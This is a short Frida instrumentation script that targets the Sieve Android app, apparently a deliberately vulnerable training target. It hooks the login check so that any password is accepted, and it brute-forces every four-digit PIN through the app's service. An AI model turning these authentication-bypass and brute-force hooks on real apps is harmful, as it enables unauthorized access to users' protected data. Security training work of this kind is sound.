setImmediate(function(){

Java.perform(function(){

var login_by = Java.use("com.mwr.example.sieve.MainLoginActivity");
var sh_login_by = Java.use("com.mwr.example.sieve.ShortLoginActivity");
login_by.checkKeyResult.implementation = function(arg){
arg = true;
console.log("cls");
this.checkKeyResult(arg);
}
function padTOFour(number){
    if(number<=9999){
        number = ("000"+number).slice(-4);
    return String(number);    
    }
    
}

sh_login_by.submit.implementation = function(arg){
    var service = this.serviceConnection.value;
    for(var i=0;i <10000; i++){
        var pin = padTOFour(i);
        service.checkPin(pin)
        console.log(pin);

    }

    console.log("cls");
   
    }


})



})